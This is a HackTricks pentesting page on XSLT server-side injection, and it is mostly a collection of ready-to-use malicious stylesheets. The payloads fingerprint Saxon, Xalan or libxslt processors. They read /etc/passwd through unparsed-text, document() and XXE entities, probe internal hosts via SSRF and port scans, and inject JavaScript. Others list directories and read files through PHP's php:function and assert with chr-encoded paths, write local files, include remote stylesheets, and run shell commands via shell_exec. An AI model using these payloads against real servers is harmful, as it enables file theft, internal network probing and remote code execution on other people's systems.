# XSLT Server Side Injection (Extensible Stylesheet Languaje Transformations)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

It is used to transform XML documents in another kind. Versions: 1, 2 and 3 (1 is the most used).\
The transformation can be done in the server or in the browser).

The most used frameworks are: **Libxslt** (Gnome), **Xalan** (Apache) and **Saxon** (Saxonica).

In order to exploit this kind of vulnerability you need to be able to store xsl tags in the server side and then access that content. An example of this kind of vulnerability can be found on [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)

## Example - Tutorial

```bash
sudo apt-get install default-jdk
sudo apt-get install libsaxonb-java libsaxon-java
```

{% code title="xml.xml" %}
```markup
<?xml version="1.0" encoding="UTF-8"?>
<catalog>
    <cd>
        <title>CD Title</title>
        <artist>The artist</artist>
        <company>Da Company</company>
        <price>10000</price>
        <year>1760</year>
    </cd>
</catalog>
```
{% endcode %}

{% code title="xsl.xsl" %}
```markup
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
    <html>
    <body>
    <h2>The Super title</h2>
    <table border="1">
        <tr bgcolor="#9acd32">
            <th>Title</th>
            <th>artist</th>
        </tr>
        <tr>
        <td><xsl:value-of select="catalog/cd/title"/></td>
        <td><xsl:value-of select="catalog/cd/artist"/></td>
        </tr>
    </table>
    </body>
    </html>
</xsl:template>
</xsl:stylesheet>
```
{% endcode %}

Execute:

```markup
$ saxonb-xslt -xsl:xsl.xsl xml.xml
 
Warning: at xsl:stylesheet on line 2 column 80 of xsl.xsl:
  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<html>
   <body>
      <h2>The Super title</h2>
      <table border="1">
         <tr bgcolor="#9acd32">
            <th>Title</th>
            <th>artist</th>
         </tr>
         <tr>
            <td>CD Title</td>
            <td>The artist</td>
         </tr>
      </table>
   </body>
</html>
```

### Fingerprint

{% code title="detection.xsl" %}
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
 Version: <xsl:value-of select="system-property('xsl:version')" /><br />
 Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
 Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
 <xsl:if test="system-property('xsl:product-name')">
 Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:product-version')">
 Product Version: <xsl:value-of select="system-property('xsl:product-version')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:is-schema-aware')">
 Is Schema Aware ?: <xsl:value-of select="system-property('xsl:is-schema-aware')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:supports-serialization')">
 Supports Serialization: <xsl:value-of select="system-property('xsl:supportsserialization')"
/><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:supports-backwards-compatibility')">
 Supports Backwards Compatibility: <xsl:value-of select="system-property('xsl:supportsbackwards-compatibility')"
/><br />
 </xsl:if>
</xsl:template>
</xsl:stylesheet>
```
{% endcode %}

And execute

```markup
$saxonb-xslt -xsl:detection.xsl xml.xml 

Warning: at xsl:stylesheet on line 2 column 80 of detection.xsl:
  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<h2>XSLT identification</h2><b>Version:</b>2.0<br><b>Vendor:</b>SAXON 9.1.0.8 from Saxonica<br><b>Vendor URL:</b>http://www.saxonica.com/<br>
```

### Read Local File

{% code title="read.xsl" %}
```markup
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
</xsl:template>
</xsl:stylesheet>
```
{% endcode %}

```markup
$ saxonb-xslt -xsl:read.xsl xml.xml

Warning: at xsl:stylesheet on line 1 column 111 of read.xsl:
  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<?xml version="1.0" encoding="UTF-8"?>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
```

### SSRF

```markup
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:include href="http://127.0.0.1:8000/xslt"/>
<xsl:template match="/">
</xsl:template>
</xsl:stylesheet>
```

### Versions

There might be more or less functions depending on the XSLT version used:

* [https://www.w3.org/TR/xslt-10/](https://www.w3.org/TR/xslt-10/)
* [https://www.w3.org/TR/xslt20/](https://www.w3.org/TR/xslt20/)
* [https://www.w3.org/TR/xslt-30/](https://www.w3.org/TR/xslt-30/)

## Fingerprint

Upload this and take information

```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
 Version: <xsl:value-of select="system-property('xsl:version')" /><br />
 Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
 Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
 <xsl:if test="system-property('xsl:product-name')">
 Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:product-version')">
 Product Version: <xsl:value-of select="system-property('xsl:product-version')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:is-schema-aware')">
 Is Schema Aware ?: <xsl:value-of select="system-property('xsl:is-schema-aware')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:supports-serialization')">
 Supports Serialization: <xsl:value-of select="system-property('xsl:supportsserialization')"
/><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:supports-backwards-compatibility')">
 Supports Backwards Compatibility: <xsl:value-of select="system-property('xsl:supportsbackwards-compatibility')"
/><br />
 </xsl:if>
</xsl:template>
</xsl:stylesheet>
```

## SSRF

```markup
<esi:include src="http://10.10.10.10/data/news.xml" stylesheet="http://10.10.10.10//news_template.xsl">
</esi:include>
```

## Javascript Injection

```markup
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<script>confirm("We're good");</script>
</xsl:template>
</xsl:stylesheet>
```

## Directory listing (PHP)

### **Opendir + readdir**

```markup
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('opendir','/path/to/dir')"/>
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
</xsl:template></xsl:stylesheet>
```

### **Assert (var\_dump + scandir + false)**

```markup
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
    <body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
        <xsl:copy-of name="asd" select="php:function('assert','var_dump(scandir(chr(46).chr(47)))==3')" />
        <br />
    </body>
</html>
```

## Read files

### **Internal - PHP**

```markup
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', ‘utf-8')"/>
</xsl:template>
</xsl:stylesheet>
```

### **Internal - XXE**

```markup
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "/etc/passwd">]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
&ext_file;
</xsl:template>
</xsl:stylesheet>
```

### **Through HTTP**

```markup
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<xsl:value-of select="document('/etc/passwd')"/>
</xsl:template>
</xsl:stylesheet>
```

```markup
<!DOCTYPE xsl:stylesheet [
<!ENTITY passwd SYSTEM "file:///etc/passwd" >]>
<xsl:template match="/">
&passwd;
</xsl:template>
```

### **Internal (PHP-function)**

```markup
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('file_get_contents','/path/to/file')"/>
</xsl:template>
</xsl:stylesheet>
```

```markup
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
    <body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
        <xsl:copy-of name="asd" select="php:function('assert','var_dump(file_get_contents(scandir(chr(46).chr(47))[2].chr(47).chr(46).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))==3')" />
        <br />
    </body>
</html>
```

### Port scan

```markup
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="document('http://example.com:22')"/>
</xsl:template>
</xsl:stylesheet>
```

## Write to a file

### XSLT 2.0

```markup
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:result-document href="local_file.txt">
<xsl:text>Write Local File</xsl:text>
</xsl:result-document>
</xsl:template>
</xsl:stylesheet>
```

### **Xalan-J extension**

```markup
<xsl:template match="/">
<redirect:open file="local_file.txt"/>
<redirect:write file="local_file.txt"/> Write Local File</redirect:write>
<redirect:close file="loxal_file.txt"/>
</xsl:template>
```

Other ways to write files in the PDF

## Include external XSL

```markup
<xsl:include href="http://extenal.web/external.xsl"/>
```

```markup
<?xml version="1.0" ?>
<?xml-stylesheet type="text/xsl" href="http://external.web/ext.xsl"?>
```

## Execute code

### **php:function**

```markup
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('shell_exec','sleep 10')" />
</xsl:template>
</xsl:stylesheet>
```

```markup
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
<xsl:copy-of name="asd" select="php:function('assert','var_dump(scandir(chr(46).chr(47)));')" />
<br />
</body>
</html>
```

Execute code using other frameworks in the PDF

### **More Languages**

**In this page you can find examples of RCE in other languajes:** [**https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt\_injection#C%23%2FVB.NET%2FASP.NET**](https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt\_injection#C%23%2FVB.NET%2FASP.NET) **(C#, Java, PHP)**

## **Access PHP static functions from classes**

The following function will call the static method `stringToUrl` of the class XSL:

```markup
<!--- More complex test to call php class function-->
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"
version="1.0">
<xsl:output method="html" version="XHTML 1.0" encoding="UTF-8" indent="yes" />
<xsl:template match="root">
<html>
<!-- We use the php suffix to call the static class function stringToUrl() -->
<xsl:value-of select="php:function('XSL::stringToUrl','une_superstring-àÔ|modifier')" />
<!-- Output: 'une_superstring ao modifier' -->
</html>
</xsl:template>
</xsl:stylesheet>
```

(Example from [http://laurent.bientz.com/Blog/Entry/Item/using\_php\_functions\_in\_xsl-7.sls](http://laurent.bientz.com/Blog/Entry/Item/using\_php\_functions\_in\_xsl-7.sls))

## **Brute-Force Detection List**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xslt.txt" %}

## **References**

* [XSLT\_SSRF](https://feelsec.info/wp-content/uploads/2018/11/XSLT\_SSRF.pdf)\\
* [http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20IO%20Active.pdf](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20IO%20Active.pdf)\\
* [http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20Blackhat%202015.pdf](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20Blackhat%202015.pdf)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
